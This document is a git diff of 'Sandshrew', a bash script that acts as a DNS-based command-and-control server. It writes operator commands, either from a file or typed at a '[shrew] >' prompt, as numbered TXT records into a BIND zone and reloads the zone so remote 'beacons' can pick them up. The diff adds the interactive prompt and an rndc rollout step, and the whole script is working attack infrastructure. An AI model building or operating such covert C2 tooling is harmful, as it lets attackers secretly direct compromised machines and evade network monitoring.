@@ -1,13 +1,11 @@
 #!/bin/bash
 # Sandshrew
-# Takes script and deploys it to the beacons
+# Takes script or user input and deploys it to the beacons
 # Author - Doshmajhan
 
-# TODO - Interactive prompt for entering commands.
-#        Command line options to enter pre-written or enter them interactivily
-#        ASCII Art
 
 zone="/etc/bind/dosh.cloud"
+regzone="dosh.cloud"
 file=""
 
 # Function to deploy pre-written script to beacons
@@ -38,19 +36,21 @@ interactive(){
     # Reset file
     sed -i '11,/-End/d' $zone
 
-    x=0
-    last=x
+    x=1
+    last=$x
     # Initialize number of commands
-    echo "num      IN  TXT \"$x\"" >> $zone
+    echo "num     IN  TXT \"$x\"" >> $zone
 
     # Prompt to enter commands
     while true; do
         read -p "[shrew] > " input
         if [[ $input == "exit" ]]; then
             exit
+        elif [[ $input == "rollout" ]]; then
+            rollout
         elif [[ $input != '' ]]; then
             # Update number of commands and add new command
-            sed -i '10s/$last/$x/' $zone
+            sed -i "11s/$last/$x/" $zone
             echo "$x       IN  TXT \"$input\"" >> $zone
             last=$x
             let x=x+1
@@ -59,10 +59,16 @@ interactive(){
 
 }
 
+# User is done entering commands, reloading the zone file
+rollout(){
+    roll=$(rndc reload $regzone; rndc reconfig)
+}
+
 # Main function reading in command line arguments
 main(){
 
     # Print title and ascii art
+    clear
     cat ascii.txt
     cat title.txt
     echo
@@ -70,7 +76,6 @@ main(){
         file=$1
         deploy_file
     else
-        echo "ENTERING INTERACTIVE MODE"
         interactive
     fi
 }
